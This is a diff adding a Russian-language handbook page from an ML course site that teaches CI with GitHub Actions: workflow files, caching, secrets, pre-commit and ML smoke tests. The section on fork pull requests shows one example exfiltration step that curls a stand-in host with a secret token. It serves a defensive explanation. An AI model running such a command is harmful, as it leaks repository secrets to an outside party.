@@ -1,0 +1,327 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CI: тесты и линтер на каждый коммит · EDU FAMCS</title>
+<meta name="description" content="CI: тесты и линтер на каждый коммит — Инженерия: от ноутбука до сервиса. Хендбук ML-курса ФПМИ.">
+<meta name="theme-color" content="#060A16">
+<meta name="robots" content="noindex, nofollow">
+<meta name="htmx-config" content='{"allowEval":false,"includeIndicatorStyles":false,"historyCacheSize":0,"selfRequestsOnly":true}'>
+<meta name="katex-js" content="/edufamcs-demo/static/vendor/katex/katex.min.js">
+<meta name="katex-css" content="/edufamcs-demo/static/vendor/katex/katex.min.css">
+<link rel="icon" href="/edufamcs-demo/static/brand/logo/favicon-16.svg" type="image/svg+xml" sizes="16x16">
+<link rel="icon" href="/edufamcs-demo/static/brand/logo/favicon.svg" type="image/svg+xml" sizes="any">
+<link rel="preload" href="/edufamcs-demo/static/brand/fonts/manrope-cyrillic-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/edufamcs-demo/static/brand/fonts/unbounded-cyrillic-800.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="stylesheet" href="/edufamcs-demo/static/brand/fonts.css">
+<link rel="stylesheet" href="/edufamcs-demo/static/brand/tokens.css">
+<link rel="stylesheet" href="/edufamcs-demo/static/brand/components.css">
+<link rel="stylesheet" href="/edufamcs-demo/static/css/site.css">
+<link rel="stylesheet" href="/edufamcs-demo/static/css/hub.css">
+<link rel="stylesheet" href="/edufamcs-demo/static/css/about.css">
+<link rel="stylesheet" href="/edufamcs-demo/static/handbook/handbook.css">
+<script src="/edufamcs-demo/static/js/theme.js"></script>
+<script src="/edufamcs-demo/static/vendor/htmx/htmx.min.js" defer></script>
+<script src="/edufamcs-demo/static/vendor/alpine/alpine-csp.min.js" defer></script>
+<script src="/edufamcs-demo/static/js/site.js" defer></script>
+<script src="/edufamcs-demo/static/handbook/handbook.js" defer></script>
+</head>
+<body class="" hx-headers='{"X-CSRFToken": "efuJFXPsNbaohtfWYAyxW5qyLSxXMdSSQsjGVZojOYoXsMuoX3MuEYiwd1EVwXRz"}'>
+<a class="skip" href="#main">К содержанию</a>
+<div class="demo-bar" role="note">Демо-версия для отзывов: вход, запись на курсы и формы здесь не работают.</div>
+
+<header class="hdr">
+  <div class="container">
+    <a class="brand" href="/edufamcs-demo/" aria-label="EDU FAMCS — главная">
+      <span class="full"><img class="only-light" src="/edufamcs-demo/static/brand/logo/logo-edu-light.svg" alt="EDU FAMCS" width="196" height="40"><img class="only-dark" src="/edufamcs-demo/static/brand/logo/logo-edu-dark.svg" alt="EDU FAMCS" width="196" height="40"></span>
+      <span class="short"><img class="only-light" src="/edufamcs-demo/static/brand/logo/logo-edu-light.svg" alt="EDU FAMCS" height="30"><img class="only-dark" src="/edufamcs-demo/static/brand/logo/logo-edu-dark.svg" alt="EDU FAMCS" height="30"></span>
+    </a>
+    <nav class="nav" id="main-nav" aria-label="Основная навигация">
+      <a href="/edufamcs-demo/#courses">Курсы</a>
+      <a href="/edufamcs-demo/ml/" >Машинное обучение</a>
+      
+      <a href="/edufamcs-demo/handbook/" aria-current="page">Хендбук</a>
+      <a href="/edufamcs-demo/news/" >Новости</a>
+      <a href="/edufamcs-demo/people/" >Авторы</a>
+      <a href="/edufamcs-demo/about/" >О&nbsp;нас</a>
+    </nav>
+    <div class="hdr-actions">
+      
+      <a class="btn btn-outline btn-login" href="/edufamcs-demo/accounts/login/?next=/handbook/engineering/ci-github-actions/">Войти</a>
+      
+      <button class="icon-btn menu-btn" type="button" aria-label="Меню" aria-expanded="false" aria-controls="main-nav"><svg class="ico" aria-hidden="true"><use href="/edufamcs-demo/static/brand/icons.svg#i-menu"/></svg></button>
+    </div>
+  </div>
+</header>
+
+<main id="main">
+
+
+
+<div class="container hb-page hb-tone">
+  <div class="hb-readbar" aria-hidden="true"><i></i></div>
+  <div class="hb">
+    <aside class="hb-nav" aria-label="Статьи раздела">
+      
+<form class="hb-search" action="/edufamcs-demo/handbook/search/" method="get" role="search">
+  <svg class="ico" aria-hidden="true"><use href="/edufamcs-demo/static/brand/icons.svg#i-search"/></svg>
+  <input class="input" type="search" name="q" value="" placeholder="Поиск по хендбуку" aria-label="Поиск по хендбуку" autocomplete="off" maxlength="120"
+    hx-get="/edufamcs-demo/handbook/search/" hx-trigger="input changed delay:250ms, search" hx-target="#hb-nav-results" hx-sync="this:replace">
+</form>
+
+      <div id="hb-nav-results" class="hb-nav-results" aria-live="polite"></div>
+      <a class="grp" href="/edufamcs-demo/handbook/engineering/">Запуск</a>
+      
+      <a class="" href="/edufamcs-demo/handbook/engineering/docker/">Docker: образы, контейнеры, Dockerfile для Python</a>
+      
+      <a class="" href="/edufamcs-demo/handbook/engineering/docker-compose/">Docker Compose: сервис, база и секреты</a>
+      
+      <a class="" href="/edufamcs-demo/handbook/engineering/gde-zapuskat-proekt/">Где запускать свой проект: ноутбук дома, VPS, облака</a>
+      
+      <a class="cur" href="/edufamcs-demo/handbook/engineering/ci-github-actions/" aria-current="page">CI: тесты и линтер на каждый коммит</a>
+      
+    </aside>
+
+    <article class="hb-main">
+      <nav class="crumbs" aria-label="Навигация"><a href="/edufamcs-demo/handbook/">Хендбук</a><svg class="ico" aria-hidden="true"><use href="/edufamcs-demo/static/brand/icons.svg#i-chev"/></svg><a href="/edufamcs-demo/handbook/engineering/">Инженерия: от ноутбука до сервиса</a></nav>
+      <h1 class="h1">CI: тесты и линтер на каждый коммит</h1>
+      <div class="hb-meta">
+        
+        
+        <span><svg class="ico" aria-hidden="true"><use href="/edufamcs-demo/static/brand/icons.svg#i-clock"/></svg>10&nbsp;мин</span>
+        <span class="hb-authors"><span class="avatar sm" title="Артем Лебедевич">АЛ</span>Артем Лебедевич</span>
+        <span><svg class="ico" aria-hidden="true"><use href="/edufamcs-demo/static/brand/icons.svg#i-edit"/></svg>10 ноября 2026</span>
+        
+        
+      </div>
+
+      
+      <details class="hb-mtoc">
+        <summary><svg class="ico" aria-hidden="true"><use href="/edufamcs-demo/static/brand/icons.svg#i-list"/></svg>Содержание<svg class="ico sm" aria-hidden="true"><use href="/edufamcs-demo/static/brand/icons.svg#i-chev-down"/></svg></summary>
+        <a class="l2" href="#концепции-github-actions">Концепции GitHub Actions</a><a class="l2" href="#рабочий-ciyml">Рабочий ci.yml</a><a class="l2" href="#matrix">Matrix</a><a class="l2" href="#секреты-и-форки">Секреты и форки</a><a class="l2" href="#docker-образ-в-ci">Docker-образ в CI</a><a class="l2" href="#бейдж-и-pre-commit">Бейдж и pre-commit</a><a class="l2" href="#что-тестировать-в-ml-проекте">Что тестировать в ML-проекте</a><a class="l2" href="#ловушки">Ловушки</a><a class="l2" href="#проверь-себя">Проверь себя</a><a class="l2" href="#что-почитать">Что почитать</a>
+      </details>
+      
+
+      <div class="prose"><p><strong>Continuous Integration</strong> (CI) — это автоматическая проверка каждого изменения на чистой машине: установить зависимости с нуля, прогнать линтер и тесты, при необходимости собрать образ. Она ловит то, что «у меня на ноутбуке работает»: забытую зависимость, сломанный импорт, тест, который зависит от вашего локального файла. Для ML-инженера CI — ещё и страховка от тихих поломок препроцессинга и формата данных, о которых иначе узнают по упавшей метрике.</p>
+<h2 id="концепции-github-actions">Концепции GitHub Actions</h2>
+<ul>
+<li><strong>Workflow</strong> — YAML-файл в <code>.github/workflows/</code>; описывает автоматизацию целиком.</li>
+<li><strong>Trigger</strong> (<code>on:</code>) — событие запуска: <code>push</code>, <code>pull_request</code>, <code>schedule</code> (cron), <code>workflow_dispatch</code> (кнопка), <code>release</code>.</li>
+<li><strong>Job</strong> — набор шагов на одной машине. Jobs по умолчанию идут параллельно; зависимость задаётся через <code>needs:</code>.</li>
+<li><strong>Runner</strong> — машина, на которой выполняется job. <code>ubuntu-latest</code> — виртуальная машина, которую GitHub создаёт на время job и удаляет после; ничего между запусками на ней не остаётся (кроме явного кэша).</li>
+<li><strong>Step</strong> — либо команда (<code>run:</code>), либо готовое действие (<code>uses:</code>).</li>
+</ul>
+<p>Мысленная модель: вы пишете скрипт «с нуля поставить и проверить», а GitHub гоняет его на каждый коммит в чистой ВМ. Если скрипт зелёный, у вас есть воспроизводимость; если красный — это не «баг CI», а реальная разница между вашей машиной и чистой.</p>
+<h2 id="рабочий-ciyml">Рабочий <code>ci.yml</code></h2>
+<p>Проект на <code>uv</code>: зависимости и их версии зафиксированы в <code>uv.lock</code>, а <code>ruff</code> и <code>pytest</code> лежат в dev-группе.</p>
+<div class="code"><div class="code-head"><span class="lang">yaml</span></div><pre><code>name<span class="tok-p">:</span> CI
+
+on<span class="tok-p">:</span>
+  push<span class="tok-p">:</span>
+    branches<span class="tok-p">:</span> <span class="tok-p">[</span>main<span class="tok-p">]</span>
+  pull_request<span class="tok-p">:</span>
+
+permissions<span class="tok-p">:</span>
+  contents<span class="tok-p">:</span> read
+
+concurrency<span class="tok-p">:</span>
+  group<span class="tok-p">:</span> ci-${{ github.ref }}
+  cancel-in-progress<span class="tok-p">:</span> true
+
+jobs<span class="tok-p">:</span>
+  test<span class="tok-p">:</span>
+    runs-on<span class="tok-p">:</span> ubuntu-latest
+    timeout-minutes<span class="tok-p">:</span> 15
+    strategy<span class="tok-p">:</span>
+      fail-fast<span class="tok-p">:</span> false
+      matrix<span class="tok-p">:</span>
+        python-version<span class="tok-p">:</span> <span class="tok-p">[</span><span class="tok-s">"</span><span class="tok-s">3.12</span><span class="tok-s">"</span><span class="tok-p">,</span> <span class="tok-s">"</span><span class="tok-s">3.13</span><span class="tok-s">"</span><span class="tok-p">]</span>
+    steps<span class="tok-p">:</span>
+      <span class="tok-p">-</span> uses<span class="tok-p">:</span> actions/checkout@v7
+
+      <span class="tok-p">-</span> uses<span class="tok-p">:</span> astral-sh/setup-uv@v10.3.3
+        with<span class="tok-p">:</span>
+          python-version<span class="tok-p">:</span> ${{ matrix.python-version }}
+          enable-cache<span class="tok-p">:</span> true
+
+      <span class="tok-p">-</span> name<span class="tok-p">:</span> Install dependencies
+        run<span class="tok-p">:</span> uv sync --locked
+
+      <span class="tok-p">-</span> name<span class="tok-p">:</span> Lint
+        run<span class="tok-p">:</span> <span class="tok-p">|</span>
+          uv run ruff check .
+          uv run ruff format --check .
+
+      <span class="tok-p">-</span> name<span class="tok-p">:</span> Tests
+        run<span class="tok-p">:</span> uv run pytest -q
+
+  docker<span class="tok-p">:</span>
+    needs<span class="tok-p">:</span> test
+    runs-on<span class="tok-p">:</span> ubuntu-latest
+    timeout-minutes<span class="tok-p">:</span> 15
+    steps<span class="tok-p">:</span>
+      <span class="tok-p">-</span> uses<span class="tok-p">:</span> actions/checkout@v7
+
+      <span class="tok-p">-</span> uses<span class="tok-p">:</span> astral-sh/setup-uv@v10.3.3
+        with<span class="tok-p">:</span>
+          enable-cache<span class="tok-p">:</span> true
+
+      <span class="tok-p">-</span> name<span class="tok-p">:</span> Train model artifact (synthetic data)
+        run<span class="tok-p">:</span> uv sync --locked &amp;&amp; uv run python -m churn.train
+
+      <span class="tok-p">-</span> uses<span class="tok-p">:</span> docker/setup-buildx-action@v4
+
+      <span class="tok-p">-</span> uses<span class="tok-p">:</span> docker/build-push-action@v7
+        with<span class="tok-p">:</span>
+          context<span class="tok-p">:</span> .
+          push<span class="tok-p">:</span> false
+          tags<span class="tok-p">:</span> churn:ci
+          cache-from<span class="tok-p">:</span> type=gha
+          cache-to<span class="tok-p">:</span> type=gha,mode=max
+</code></pre></div>
+<p>Модель обучается в CI до сборки образа, потому что <code>Dockerfile</code> делает <code>COPY artifacts ./artifacts</code>, а каталог <code>artifacts/</code> в <code>.gitignore</code>: на свежем чекауте артефакта нет, и сборка без этого шага падает.</p>
+<p>Разберём не очевидное.</p>
+<ul>
+<li><code>uv sync --locked</code> падает, если <code>uv.lock</code> не соответствует <code>pyproject.toml</code>. Это ровно то, что нужно: забыли закоммитить обновлённый lock-файл — CI красный, а не «у коллеги стоят другие версии».</li>
+<li><code>permissions: contents: read</code> — токен workflow получает минимум прав; расширяйте точечно, если job что-то публикует.</li>
+<li><code>concurrency</code> отменяет устаревший запуск при новом пуше в ту же ветку и экономит минуты.</li>
+<li><code>timeout-minutes</code> защищает от зависшего теста, который сжёг бы весь лимит.</li>
+<li>Версии действий — актуальные на ноябрь 2026 (<code>actions/checkout</code> v7, <code>docker/build-push-action</code> v7, <code>docker/setup-buildx-action</code> v4). У <code>astral-sh/setup-uv</code> нет «плавающего» тега major-версии, поэтому указана полная <code>v10.3.3</code>; сверяйте теги на страницах репозиториев в разделе Releases. Для критичных репозиториев фиксируют действие по хэшу коммита.</li>
+</ul>
+<div class="callout md note"><p class="callout-title">Кэш</p>
+<p><code>enable-cache: true</code> у <code>setup-uv</code> сохраняет кэш uv между запусками; ключ строится по <code>uv.lock</code> и другим файлам зависимостей, так что при смене зависимостей кэш обновится сам. Кэш слоёв Docker (<code>type=gha</code>) работает аналогично. Кэш — оптимизация: сборка должна проходить и без него.</p>
+</div>
+<h2 id="matrix">Matrix</h2>
+<p><code>matrix</code> запускает один job в нескольких вариантах: версии Python, ОС, версии ключевой библиотеки. Для сервиса достаточно версии, которую вы используете в продакшене, плюс следующей; для библиотеки — все поддерживаемые. <code>fail-fast: false</code> не обрывает остальные варианты после первого падения: вы видите полную картину.</p>
+<h2 id="секреты-и-форки">Секреты и форки</h2>
+<p>Секреты (<code>Settings → Secrets and variables → Actions</code>) доступны как <code>${{ secrets.NAME }}</code> и маскируются в логах. Передавайте их только в шаги, которым они нужны:</p>
+<div class="code"><div class="code-head"><span class="lang">yaml</span></div><pre><code>      <span class="tok-p">-</span> name<span class="tok-p">:</span> Push image
+        env<span class="tok-p">:</span>
+          REGISTRY_TOKEN<span class="tok-p">:</span> ${{ secrets.REGISTRY_TOKEN }}
+        run<span class="tok-p">:</span> echo "$REGISTRY_TOKEN" | docker login ghcr.io -u "$GITHUB_ACTOR" --password-stdin
+</code></pre></div>
+<p>Для pull request <strong>из форка</strong> секреты не передаются, а токен получает только права на чтение: иначе любой мог бы открыть PR с шагом <code>run: curl evil.example -d "$TOKEN"</code> и украсть секреты. Поэтому тесты не должны требовать секретов; всё, что требует, — отдельный job на <code>push</code> в <code>main</code>. Отдельная опасность — триггер <code>pull_request_target</code>, который исполняется с секретами и правами базового репозитория: не запускайте в нём код из PR.</p>
+<div class="callout md warn"><p class="callout-title">Секрет в логе</p>
+<p>GitHub маскирует точное значение секрета, но не его производные (base64, часть строки). Не печатайте <code>env</code> и не включайте <code>set -x</code> в шагах с секретами.</p>
+</div>
+<h2 id="docker-образ-в-ci">Docker-образ в CI</h2>
+<p>Job <code>docker</code> выше только <strong>собирает</strong> образ без публикации: этого достаточно, чтобы поймать сломанный <code>Dockerfile</code>. Публикацию (<code>push: true</code> и вход в реестр, например GitHub Container Registry) добавляйте только для <code>main</code> и с правом <code>packages: write</code> на уровне job, а не всего workflow. Подробно про образы — в статье <a href="/edufamcs-demo/handbook/engineering/docker/" rel="noopener noreferrer nofollow">Docker</a>.</p>
+<h2 id="бейдж-и-pre-commit">Бейдж и pre-commit</h2>
+<p>Статус workflow выводится бейджем в README (замените <code>OWNER/REPO</code> на свои):</p>
+<div class="code"><div class="code-head"><span class="lang">text</span></div><pre><code>![CI](https://github.com/OWNER/REPO/actions/workflows/ci.yml/badge.svg)
+</code></pre></div>
+<p>Чтобы красный CI не стал сюрпризом, те же проверки гоняют локально перед коммитом через <strong>pre-commit</strong>:</p>
+<div class="code"><div class="code-head"><span class="lang">yaml</span></div><pre><code><span class="tok-c"># .pre-commit-config.yaml</span>
+repos<span class="tok-p">:</span>
+  <span class="tok-p">-</span> repo<span class="tok-p">:</span> https://github.com/astral-sh/ruff-pre-commit
+    rev<span class="tok-p">:</span> v0.17.4
+    hooks<span class="tok-p">:</span>
+      <span class="tok-p">-</span> id<span class="tok-p">:</span> ruff-check
+        args<span class="tok-p">:</span> <span class="tok-p">[</span>--fix<span class="tok-p">]</span>
+      <span class="tok-p">-</span> id<span class="tok-p">:</span> ruff-format
+</code></pre></div>
+<p>Установка: <code>uv add --dev pre-commit &amp;&amp; uv run pre-commit install</code>. Локальный хук — удобство, CI — гарантия: хук можно обойти флагом <code>--no-verify</code>, CI — нет. Значение <code>rev</code> подставьте актуальное из релизов репозитория.</p>
+<h2 id="что-тестировать-в-ml-проекте">Что тестировать в ML-проекте</h2>
+<p>Модель на accuracy не проверишь юнит-тестом, зато вокруг неё много детерминированного кода, где ошибки дороги:</p>
+<ul>
+<li><strong>Схема данных</strong>: колонки, типы, допустимые диапазоны, доля пропусков (<code>pandera</code>, <code>pydantic</code> или ручные <code>assert</code>).</li>
+<li><strong>Формы</strong>: на выходе препроцессинга число признаков и порядок колонок совпадают с тем, что ждёт модель.</li>
+<li><strong>Детерминизм препроцессинга</strong>: одинаковый вход даёт одинаковый выход; <code>fit</code> на трейне, <code>transform</code> на тесте, никаких утечек.</li>
+<li><strong>Смоук-обучение</strong>: <code>fit</code> на 200 строках за секунды, затем <code>predict</code> возвращает нужную форму и значения в <span class="tex">[0,1]</span>. Метрику здесь не оцениваем, проверяем, что пайплайн целиком не падает.</li>
+<li><strong>Контракт сервиса</strong>: <code>/healthz</code> отвечает 200, <code>/predict</code> возвращает ожидаемые поля (<code>TestClient</code> из FastAPI, см. <a href="/edufamcs-demo/handbook/engineering/http-i-fastapi/" rel="noopener noreferrer nofollow">HTTP и FastAPI</a>).</li>
+</ul>
+<div class="code"><div class="code-head"><span class="lang">python</span></div><pre><code><span class="tok-k">import</span> numpy <span class="tok-k">as</span> np
+<span class="tok-k">from</span> sklearn.linear_model <span class="tok-k">import</span> LogisticRegression
+
+
+<span class="tok-k">def</span> <span class="tok-f">test_smoke_train_predict</span><span class="tok-p">(</span><span class="tok-p">)</span><span class="tok-p">:</span>
+    rng <span class="tok-p">=</span> np<span class="tok-p">.</span>random<span class="tok-p">.</span>default_rng<span class="tok-p">(</span><span class="tok-n">0</span><span class="tok-p">)</span>
+    X <span class="tok-p">=</span> rng<span class="tok-p">.</span>normal<span class="tok-p">(</span>size<span class="tok-p">=</span><span class="tok-p">(</span><span class="tok-n">200</span><span class="tok-p">,</span> <span class="tok-n">5</span><span class="tok-p">)</span><span class="tok-p">)</span>
+    y <span class="tok-p">=</span> <span class="tok-p">(</span>X<span class="tok-p">[</span><span class="tok-p">:</span><span class="tok-p">,</span> <span class="tok-n">0</span><span class="tok-p">]</span> <span class="tok-p">+</span> rng<span class="tok-p">.</span>normal<span class="tok-p">(</span>scale<span class="tok-p">=</span><span class="tok-n">0.5</span><span class="tok-p">,</span> size<span class="tok-p">=</span><span class="tok-n">200</span><span class="tok-p">)</span> <span class="tok-p">&gt;</span> <span class="tok-n">0</span><span class="tok-p">)</span><span class="tok-p">.</span>astype<span class="tok-p">(</span><span class="tok-f">int</span><span class="tok-p">)</span>
+    model <span class="tok-p">=</span> LogisticRegression<span class="tok-p">(</span><span class="tok-p">)</span><span class="tok-p">.</span>fit<span class="tok-p">(</span>X<span class="tok-p">,</span> y<span class="tok-p">)</span>
+    p <span class="tok-p">=</span> model<span class="tok-p">.</span>predict_proba<span class="tok-p">(</span>X<span class="tok-p">[</span><span class="tok-p">:</span><span class="tok-n">10</span><span class="tok-p">]</span><span class="tok-p">)</span><span class="tok-p">[</span><span class="tok-p">:</span><span class="tok-p">,</span> <span class="tok-n">1</span><span class="tok-p">]</span>
+    <span class="tok-k">assert</span> p<span class="tok-p">.</span>shape <span class="tok-p">==</span> <span class="tok-p">(</span><span class="tok-n">10</span><span class="tok-p">,</span><span class="tok-p">)</span> <span class="tok-k">and</span> <span class="tok-p">(</span><span class="tok-p">(</span>p <span class="tok-p">&gt;</span><span class="tok-p">=</span> <span class="tok-n">0</span><span class="tok-p">)</span> <span class="tok-p">&amp;</span> <span class="tok-p">(</span>p <span class="tok-p">&lt;</span><span class="tok-p">=</span> <span class="tok-n">1</span><span class="tok-p">)</span><span class="tok-p">)</span><span class="tok-p">.</span>all<span class="tok-p">(</span><span class="tok-p">)</span>
+</code></pre></div>
+<p>Бесплатные минуты на GitHub Actions ограничены и зависят от типа репозитория и тарифа; актуальные лимиты смотрите на странице биллинга GitHub. Тяжёлое обучение в CI не запускайте.</p>
+<h2 id="ловушки">Ловушки</h2>
+<ul>
+<li>Зелёный CI без единого теста: «проверка» ничего не проверяет.</li>
+<li>Тесты читают файл с вашего ноутбука или обращаются к сети и базе, которых нет на раннере.</li>
+<li><code>pip install</code> без lock-файла: сегодня зелёное, завтра красное из-за новой версии зависимости.</li>
+<li>Секреты в <code>echo</code>, в артефактах, в <code>pull_request_target</code> с чужим кодом.</li>
+<li>Версии действий не обновляются годами (или, наоборот, <code>@main</code> вместо тега).</li>
+<li>Спрашивают на собеседовании: чем CI отличается от CD; как ускорить пайплайн (кэш, параллельные jobs, <code>needs</code>); почему секреты не доходят до PR из форка; что тестировать в ML-проекте и чем смоук-тест отличается от юнит-теста.</li>
+</ul>
+<h2 id="проверь-себя">Проверь себя</h2>
+<details class="callout md details"><summary>Зачем `uv sync --locked`, а не просто `uv sync`?</summary>
+<p><code>--locked</code> падает, если <code>uv.lock</code> расходится с <code>pyproject.toml</code>; обычный <code>sync</code> молча обновил бы lock. В CI нужна проверка, что закоммичено именно то окружение, которое вы тестировали.</p>
+</details>
+<details class="callout md details"><summary>Почему PR из форка не получает секреты репозитория?</summary>
+<p>Автор форка контролирует код workflow в PR и мог бы вывести секреты наружу. Поэтому такие запуски идут без секретов и с токеном только на чтение.</p>
+</details>
+<details class="callout md details"><summary>Чем кэш отличается от артефакта?</summary>
+<p>Кэш — оптимизация, ключ вычисляется по зависимостям, его может не оказаться; артефакт — результат конкретного запуска, который вы сохраняете и скачиваете.</p>
+</details>
+<details class="callout md details"><summary>Какие тесты написать для препроцессинга признаков?</summary>
+<p>Схема входа, порядок и число колонок на выходе, детерминизм на одном входе, отсутствие обращения к тестовым данным при <code>fit</code>, поведение на пропусках и неизвестных категориях.</p>
+</details>
+<h2 id="что-почитать">Что почитать</h2>
+<ul>
+<li>GitHub Actions, документация: https://docs.github.com/en/actions</li>
+<li>Безопасность workflow (secrets, forks, pull_request_target): https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions</li>
+<li><code>astral-sh/setup-uv</code>: https://github.com/astral-sh/setup-uv</li>
+<li>uv в GitHub Actions: https://docs.astral.sh/uv/guides/integration/github/</li>
+<li>Ruff: https://docs.astral.sh/ruff/</li>
+<li>pre-commit: https://pre-commit.com/</li>
+<li>Docker, GitHub Actions: https://docs.docker.com/build/ci/github-actions/</li>
+</ul>
+</div>
+      
+
+      
+
+      
+      <nav class="pager" aria-label="Соседние статьи">
+        <a href="/edufamcs-demo/handbook/engineering/gde-zapuskat-proekt/"><span><svg class="ico sm" aria-hidden="true"><use href="/edufamcs-demo/static/brand/icons.svg#i-arrow-left"/></svg>Назад</span>Где запускать свой проект: ноутбук дома, VPS, облака</a>
+        <a href="/edufamcs-demo/handbook/engineering/logi-i-metriki/"><span>Дальше<svg class="ico sm" aria-hidden="true"><use href="/edufamcs-demo/static/brand/icons.svg#i-arrow"/></svg></span>Логи и метрики: Prometheus</a>
+      </nav>
+      
+    </article>
+
+    <aside class="hb-toc" aria-label="На этой странице">
+      <a class="l2" href="#концепции-github-actions">Концепции GitHub Actions</a><a class="l2" href="#рабочий-ciyml">Рабочий ci.yml</a><a class="l2" href="#matrix">Matrix</a><a class="l2" href="#секреты-и-форки">Секреты и форки</a><a class="l2" href="#docker-образ-в-ci">Docker-образ в CI</a><a class="l2" href="#бейдж-и-pre-commit">Бейдж и pre-commit</a><a class="l2" href="#что-тестировать-в-ml-проекте">Что тестировать в ML-проекте</a><a class="l2" href="#ловушки">Ловушки</a><a class="l2" href="#проверь-себя">Проверь себя</a><a class="l2" href="#что-почитать">Что почитать</a>
+    </aside>
+  </div>
+</div>
+
+
+</main>
+
+<footer class="ftr" data-theme="dark">
+  <svg class="sym fern" viewBox="0 0 40.5 65.02" aria-hidden="true"><use href="/edufamcs-demo/static/brand/icons.svg#fern"/></svg>
+  <div class="container">
+    <div class="ftr-row">
+      <a href="/edufamcs-demo/" aria-label="EDU FAMCS — главная"><img src="/edufamcs-demo/static/brand/logo/logo-edu-dark.svg" alt="EDU FAMCS" width="196" height="40"></a>
+      <ul class="ftr-links">
+        <li><a href="/edufamcs-demo/#courses">Курсы</a></li>
+        <li><a href="/edufamcs-demo/ml/">Машинное обучение</a></li>
+        <li><a href="/edufamcs-demo/handbook/">Хендбук</a></li>
+        <li><a href="/edufamcs-demo/news/">Новости</a></li>
+        <li><a href="/edufamcs-demo/people/">Авторы</a></li>
+        <li><a href="/edufamcs-demo/about/">О&nbsp;нас</a></li>
+        <li><a href="/edufamcs-demo/propose/">Предложить или исправить</a></li>
+        <li><a href="/edufamcs-demo/privacy/">Конфиденциальность</a></li>
+      </ul>
+    </div>
+    <div class="ftr-big" aria-hidden="true">EDU<span class="d">·</span>FAMCS</div>
+    <p class="ftr-copy">© 2026 EDU FAMCS · Минск</p>
+  </div>
+</footer>
+
+<div class="toasts-region" aria-live="polite" id="toasts">
+
+</div>
+
+</body>
+</html>
